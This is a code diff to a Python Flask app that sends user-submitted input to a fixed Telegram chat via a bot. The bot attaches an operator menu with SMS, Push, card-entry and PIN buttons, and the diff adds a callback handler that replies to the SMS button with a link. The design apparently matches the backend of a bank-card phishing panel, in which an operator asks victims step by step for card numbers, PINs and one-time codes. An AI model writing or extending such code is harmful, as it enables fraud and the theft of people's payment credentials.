@@ -12,8 +12,9 @@ CHAT_ID = "294154587"
 def get_menu_keyboard():
     return {
         "inline_keyboard": [
-            [{"text": "SMS", "callback_data": "sms"},
-             {"text": "Пуш", "callback_data": "push"},
+            [{"text": "SMS", "callback_data": "redirect_sms"}],  # Изменено callback_data
+
+            [{"text": "Пуш", "callback_data": "push"},
              {"text": "Ввод карты", "callback_data": "card"},
              {"text": "PIN", "callback_data": "pin"}],
 
@@ -44,7 +45,7 @@ def send_to_telegram():
     if not user_input:
         return jsonify({"error": "Введите данные!"}), 400
 
-    # 📌 Отправляем сообщение в Telegram с меню (reply_markup)
+    # 📌 Отправляем сообщение в Telegram с меню
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -58,6 +59,30 @@ def send_to_telegram():
         return jsonify({"message": "✅ Данные успешно отправлены с меню!"})
     else:
         return jsonify({"error": "❌ Ошибка отправки!"}), 500
+
+@app.route('/callback', methods=['POST'])
+def handle_callback():
+    """Обрабатывает нажатия кнопок"""
+    data = request.json
+    callback_query = data.get("callback_query", {})
+
+    if not callback_query:
+        return jsonify({"error": "Нет данных в callback_query"}), 400
+
+    callback_data = callback_query.get("data")
+    chat_id = callback_query["message"]["chat"]["id"]
+
+    if callback_data == "redirect_sms":
+        # Отправляем пользователю ссылку
+        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": "🔗 Нажмите на ссылку: [Перейти на сайт](https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/)",
+            "parse_mode": "Markdown"
+        }
+        requests.post(telegram_url, json=payload)
+
+    return jsonify({"message": "✅ Обработано!"})
 
 if __name__ == "__main__":
     from waitress import serve
